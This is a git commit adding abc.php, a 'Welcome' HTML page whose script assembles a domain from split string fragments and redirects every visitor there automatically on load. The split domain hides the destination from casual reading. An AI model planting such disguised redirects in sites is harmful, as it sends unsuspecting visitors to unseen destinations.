166094e7025fe12571336ecd2f014ccac8432dbf
akkuyb <87874746+akkuyb@users.noreply.github.com>
2021-08-06 22:55:09 -0700

    Create abc.php

---
+++ abc.php
@@ -0,0 +1,9 @@
+<html><head><title>Welcome</title></head><body>
+  <script>
+    var one = 'https://tamil.';
+    var two = 'mallu.';
+    var three = 'fun';
+    window.location.href = one+two+three;
+  </script>
+  </body>
+</html>
